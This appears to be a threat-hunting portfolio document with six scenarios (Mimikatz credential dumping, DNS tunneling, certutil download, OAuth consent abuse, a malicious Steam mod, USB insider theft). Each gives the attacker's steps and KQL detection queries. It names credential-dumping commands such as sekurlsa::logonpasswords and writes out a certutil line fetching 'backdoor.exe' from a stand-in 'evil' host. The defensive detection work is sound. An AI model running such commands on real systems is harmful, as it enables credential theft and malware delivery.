# Threat Event (Mimikatz Credential Dumping)
**Unauthorized Credential Access Using Mimikatz**

## Reason for the Hunt:
Endpoint-Based Alert Triggered + SOC Follow-Up
EDR flagged suspicious memory access to lsass.exe from a non-standard PowerShell session.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Opened PowerShell as Administrator.
2. Downloaded Mimikatz from a GitHub clone or transferred it via USB.
3. Executed: Invoke-Mimikatz or mimikatz.exe.
4. Accessed lsass.exe to dump cleartext passwords.
5. Extracted credentials from sekurlsa::logonpasswords.
6. Used stolen creds for lateral movement.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceProcessEvents | Launch of PowerShell, mimikatz.exe, memory reads |
| DeviceImageLoadEvents | DLL injection and memory access to lsass |
| DeviceNetworkEvents | Potential exfil of dumped credentials |

---

## Related Queries (KQL):
```kql
DeviceProcessEvents
| where ProcessCommandLine has_any("mimikatz", "Invoke-Mimikatz")

DeviceImageLoadEvents
| where InitiatingProcessFileName == "mimikatz.exe" and FileName has "lsass.exe"

DeviceProcessEvents
| where ProcessCommandLine contains "sekurlsa" 
```

---



---

## Additional Notes:
- Monitor for abnormal PowerShell execution and lsass access.
- Consider enabling credential guard or LSASS protection.


# Threat Event (DNS Tunneling)
**Data Exfiltration Over DNS Requests**

## Reason for the Hunt:
Network & Application Anomaly Detected by NDR
NDR tool detected high volumes of DNS requests to unusual subdomains with repetitive patterns, potentially indicating DNS tunneling.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Used a tunneling tool like iodine, dnscat2, or Heyoka.
2. Established a covert channel over DNS (TCP/UDP port 53).
3. Encoded and exfiltrated data in DNS TXT/A/CNAME requests.
4. The endpoint sent hundreds of DNS queries/minute.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceNetworkEvents | DNS request patterns, excessive traffic |
| DnsEvents | Lookup records, suspicious subdomains |

---

## Related Queries (KQL):
```kql
DeviceNetworkEvents
| where RemoteUrl endswith ".com"
| where RemoteUrl contains "." and strlen(RemoteUrl) > 50
| summarize count() by DeviceName, RemoteUrl
```

---



---

## Additional Notes:
- DNS tunneling can evade traditional proxies and firewalls.
- Set alerts for high DNS request rates or known tunneling patterns.


# Threat Event (Certutil Abuse)
**Using certutil.exe to Download Malware**

## Reason for the Hunt:
Tool-Based Abuse (LOLBins)
Certutil.exe is often abused to download malicious files via command-line.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Launched cmd or PowerShell as user/admin.
2. Ran certutil -urlcache -split -f http://evil[.]site backdoor.exe
3. Dropped the file in %TEMP% or %AppData%.
4. Executed the payload.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceProcessEvents | certutil.exe use |
| DeviceFileEvents | backdoor.exe creation |
| DeviceNetworkEvents | connection to malicious domain |

---

## Related Queries (KQL):
```kql
DeviceProcessEvents
| where FileName == "certutil.exe" and ProcessCommandLine contains "http"

DeviceFileEvents
| where FileName == "backdoor.exe" 
```

---



---

## Additional Notes:
- Certutil is a known LOLBin.
- Can be disabled or audited via AppLocker or Microsoft Defender Attack Surface Reduction (ASR).


# Threat Event (OAuth Consent Grant Abuse)
**Malicious App Gained Access to Mail and Drive**

## Reason for the Hunt:
Cloud & SaaS Threat Intel Advisory
Threat actors are tricking users into consenting to malicious Microsoft 365 or Google apps with elevated permissions.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Created a fake app impersonating a known vendor.
2. Shared OAuth consent URL via phishing email.
3. User granted permissions without verifying app legitimacy.
4. App harvested emails and files silently via Graph API.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| CloudAppEvents | OAuth consent grants |
| CloudAuditLogs | API activity by suspicious app IDs |
| IdentityLogonEvents | Login activity tied to app |

---

## Related Queries (KQL):
```kql
CloudAppEvents
| where ApplicationDisplayName contains "invoice" and PermissionGrantType == "AdminConsent"

CloudAuditLogs
| where OperationName contains "Mail.Read" 
```

---



---

## Additional Notes:
- Monitor and restrict 3rd party app consents.
- Enforce consent policies and periodic app reviews in Microsoft 365/Azure.


# Threat Event (Steam Mod Malware)
**Malicious Steam Workshop Mod Used for Malware Drop**

## Reason for the Hunt:
Gaming & App Abuse Alert + Lateral Movement Attempt
Malicious Steam mod delivered an obfuscated binary that attempted to connect to Discord Webhooks.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Installed game mod via Steam Workshop.
2. Mod contained obfuscated binary in /mod/data/init.bin.
3. Launched binary using game engine script.
4. Executable connected to webhook for C2.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceFileEvents | mod binary dropped |
| DeviceProcessEvents | mod payload executed |
| DeviceNetworkEvents | outbound traffic to webhook |

---

## Related Queries (KQL):
```kql
DeviceFileEvents
| where FileName == "init.bin" and FolderPath contains "Steam\\steamapps"

DeviceNetworkEvents
| where RemoteUrl contains "discord.com/api/webhooks" 
```

---


---

## Additional Notes:
- Treat mod activity like any unsigned binary.
- Steam folder activity should be reviewed in enterprise environments.


# Threat Event (Insider File Theft)
**Employee Copied Confidential Files to USB Before Resignation**

## Reason for the Hunt:
Physical & Insider Threat + HR Coordination
HR flagged an employee as a flight risk. Large volume of sensitive files copied to a USB drive prior to resignation.

---

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. Plugged in USB at workstation.
2. Searched for financial and strategy documents.
3. Copied large batch of files to external drive.
4. Removed drive without triggering DLP block.

---

## Tables Used to Detect IoCs:
| **Name** | **Description** |
|----------|----------------|
| DeviceFileEvents | File copied to RemovableMedia |
| DeviceEvents | USB insert/remove events |
| DeviceNetworkEvents | Follow-on outbound access to personal cloud |

---

## Related Queries (KQL):
```kql
DeviceFileEvents
| where FolderPath contains "RemovableMedia"
| where FileName endswith ".docx" or FileName endswith ".xlsx"

DeviceEvents
| where ActionType contains "USBDriveConnected" 
```

---

## Created By:
- **Author Name**: Nigel T
- **Author Contact**: https://www.linkedin.com/in/nigel-thompson-8a7995244/
- **Date**: April 17, 2025



---

## Additional Notes:
- Combine with HR attrition watchlists and DLP rules.
- Correlate file copy events with offboarding timelines.
